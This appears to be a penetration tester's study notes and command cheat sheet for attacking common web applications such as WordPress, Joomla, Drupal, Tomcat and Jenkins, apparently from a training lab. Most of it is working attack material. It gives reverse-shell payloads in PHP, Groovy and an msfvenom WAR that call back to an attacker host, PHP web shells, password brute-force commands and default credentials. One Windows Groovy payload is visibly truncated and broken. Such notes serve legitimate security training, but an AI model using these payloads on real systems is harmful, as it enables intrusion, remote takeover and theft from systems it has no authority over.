## Common Applications

|Application|Description|
|---|---|
|WordPress|[WordPress](https://wordpress.org/) is an open-source Content Management System (CMS) that can be used for multiple purposes. It's often used to host blogs and forums. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend.|
|Drupal|[Drupal](https://www.drupal.org/) is another open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there's no DBMS installed. Like WordPress, Drupal allows users to enhance their websites through the use of themes and modules.|
|Joomla|[Joomla](https://www.joomla.org/) is yet another open-source CMS written in PHP that typically uses MySQL but can be made to run with PostgreSQL or SQLite. Joomla can be used for blogs, discussion forums, e-commerce, and more. Joomla can be customized heavily with themes and extensions and is estimated to be the third most used CMS on the internet after WordPress and Shopify.|
|Tomcat|[Apache Tomcat](https://tomcat.apache.org/) is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased with Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle.|
|Jenkins|[Jenkins](https://jenkins.io/) is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication.|
|Splunk|Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. Historically, Splunk has not suffered from a considerable amount of known vulnerabilities aside from an information disclosure vulnerability ([CVE-2018-11409](https://nvd.nist.gov/vuln/detail/CVE-2018-11409)), and an authenticated remote code execution vulnerability in very old versions ([CVE-2011-4642](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4642)).|
|PRTG Network Monitor|[PRTG Network Monitor](https://www.paessler.com/prtg) is an agentless network monitoring system that can be used to monitor metrics such as uptime, bandwidth usage, and more from a variety of devices such as routers, switches, servers, etc. It utilizes an auto-discovery mode to scan a network and then leverages protocols such as ICMP, WMI, SNMP, and NetFlow to communicate with and gather data from discovered devices. PRTG is written in [Delphi](https://en.wikipedia.org/wiki/Delphi_\(software\)).|
|osTicket|[osTicket](https://osticket.com/) is a widely-used open-source support ticketing system. It can be used to manage customer service tickets received via email, phone, and the web interface. osTicket is written in PHP and can run on Apache or IIS with MySQL as the backend.|
|GitLab|[GitLab](https://about.gitlab.com/) is an open-source software development platform with a Git repository manager, version control, issue tracking, code review, continuous integration and deployment, and more. It was originally written in Ruby but now utilizes Ruby on Rails, Go, and Vue.js. GitLab offers both community (free) and enterprises versions of the software.|

The cheat sheet is a useful command reference for this module.

| Command                                                                                                                                                                                                                                       | Description                                                                                                                                                                                                                    |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `sudo vim /etc/hosts`                                                                                                                                                                                                                         | Opens the `/etc/hosts` with `vim` to start adding hostnames                                                                                                                                                                    |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list`                                                                                                                                                       | Runs an nmap scan using common web application ports based on a scope list (`scope_list`) and outputs to a file (`web_discovery`) in all formats (`-oA`)                                                                       |
| `eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>`                                                                                                                                                                       | Runs `eyewitness` using a file generated by an nmap scan (`web_discovery.xml`) and creates a directory (`-d`)                                                                                                                  |
| `cat web_discovery.xml \| ./aquatone -nmap`                                                                                                                                                                                                   | Concatenates the contents of nmap scan output (web_discovery.xml) and pipes it to aquatone (`./aquatone`) while ensuring aquatone recognizes the file as nmap scan output (`-nmap`)                                            |
| `sudo wpscan --url <http://domainnameoripaddress> --enumerate`                                                                                                                                                                                | Runs wpscan using the `--enmuerate` flag. Can replace the url with any valid and reachable URL in each challenge                                                                                                               |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>`                                                                                                                 | Runs wpscan and uses it to perform a password attack (`--password-attack`) against the specified url and references a word list (`/usr/share/wordlists/rockyou.txt`)                                                           |
| `curl -s http://<hostnameoripoftargetsite/path/to/webshell.php?cmd=id`                                                                                                                                                                        | cURL command used to execute commands (`cmd=id`) on a vulnerable system utilizing a php-based webshell                                                                                                                         |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'");`                                                                                                                                          | PHP code that will execute a reverse shell on a Linux-based system                                                                                                                                                             |
| `droopescan scan joomla --url http://<domainnameoripaddress>`                                                                                                                                                                                 | Runs `droopescan` against a joomla site located at the specified url                                                                                                                                                           |
| `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>`                                                             | Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (`/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt`) and user or list of usernames (`-usr`)                 |
| `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>`                                                                                                                                                                                 | PHP code that will allow for web shell access on a vulnerable drupal site. Can be used through browisng to the location of the file in the web directory after saving. Can also be leveraged utilizing curl. See next command. |
| `curl -s <http://domainname or IP address of site> /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d">"`                                                                                                                  | Uses curl to navigate to php web shell file and run system commands (`=id`) on the target                                                                                                                                      |
| `gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`                                                                                                                         | `gobuster` powered directory brute forcing attack refrencing a wordlist (`/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`)                                                                                        |
| `auxiliary/scanner/http/tomcat_mgr_login`                                                                                                                                                                                                     | Useful Metasploit scanner module used to perform a bruteforce login attack against a tomcat site                                                                                                                               |
| `python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt` | Runs mgr_brute.py using python3 against the specified website starts in the /manager directory (`-P /manager`) and references a specified user or userlist ( `-u`) as well as a specified password or password list (`-p`)     |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war`                                                                                                      | Generates a jsp-based reverse shell payload in the form of a .war file utilizing `msfvenom`                                                                                                                                    |
| `nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>`                                                                                                                                                                             | Nmap scan useful in enumerating Apache Tomcat and AJP services                                                                                                                                                                 |
| `r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()`                                                                    | Groovy-based reverse shell payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. Will work when the underlying OS is Linux                                                                 |
| `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");`                                                                                                                                                                               | Groovy-based payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. This will allow webshell access and to execute commands on the underlying Windows system                                |
| `String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);`                                                                                         | Groovy-based reverse shell payload/code that can work with admin acess to the `Script Console` of a `Jenkins`site. Will work when the underlying OS is Windows                                                                 |
| [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)                                                                                                                                                                       | A simple Splunk package for obtaining revershells on Windows and Linux systems                                                                                                                                                 |

#### Wordpress :
```shell
curl -s http://blog.inlanefreight.local | grep WordPress

<meta name="generator" content="WordPress 5.8" /
```

```shell
# recon
sudo wpscan --url [url] --api-token [api token]

# bruteforce
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url 
```

#### Joomla :
Get infos about the version
```shell
curl -s http://[url]/administrator/manifests/files/joomla.xml | xmllint --format -
```

Enumeration : 
```shell
droopescan scan joomla --url 
```

#### Drupal :

```shell
droopescan scan drupal --url 
```

#### Tomcat
Apache Tomcat is an open-source web server for Java applications (Servlets & JSP). It's widely used in enterprise environments with tools like **Spring** and **Gradle**.

##### 📊 Market & Usage Stats
- 🧠 ~220k live sites using Tomcat (BuiltWith)
- 🔁 ~904k websites have used it at some point
- 🌐 1.22% of top 1M websites use Tomcat
- 🏢 Used by Alibaba, USPTO, Red Cross, LA Times  
- 📉 Ranks #13 in web server market share

##### 🕵️‍♂️ Why Pentesters Care
- ✅ Often found on **internal networks**
- ⚠️ Frequently misconfigured (default creds!)
- 🎯 Shows up as "High Value Target" in EyeWitness
- 🔐 Can provide **easy foothold** into internal systems

##### 🔎 Identification Methods
- Use HTTP headers (e.g., `Server: Apache-Coyote/1.1`)
- Try accessing: `/docs/` or invalid pages (error leaks version)
- Example curl command:


#### Jenkins 
Jenkins is an open-source automation server used for CI/CD pipelines — and it can be a goldmine in internal pentests. Think: RCE as SYSTEM 🧠

##### 📜 Quick Facts
- 🧪 Jenkins = Java-based CI server (used w/ Tomcat)
- 🏗️ 300+ plugins for build & test automation
- 🧠 Originally called **Hudson** (2005 → renamed in 2011)
- 🏢 Used by Netflix, Facebook, LinkedIn, Robinhood, etc.
- 📊 Over **86,000** companies use it
##### 🔍 Discovery & Footprinting
**Scenario:** Internal pentest reveals Jenkins on the network.
- 🛠️ Common install = **Windows + SYSTEM privileges**
- 🖥️ Default web port: `8080`
- 🔗 Master/slave communication: `5000`
- 🔒 Auth methods:
    - Local DB (default)
    - LDAP
    - Unix user DB
    - Servlet container
    - Sometimes… **No auth at all 😳**

📌 **Key Goal**: RCE → SYSTEM → AD foothold

##### 🕵️‍♂️ Enumeration Tactics

- Look for `/login` page → Classic Jenkins UI
- Check default creds:
    admin:admin
    jenkins:jenkins
    Try unauthenticated access (sadly common internally)
    Bonus: Jenkins can expose credentials and secrets in build logs or environment variables 🫢

🔑 Internal Pentest Pro Tip
If Jenkins is running as SYSTEM on a Windows box:
    You can likely pivot to domain enumeration
    Use plugins or script console for code execution (Groovy ftw)

#### 
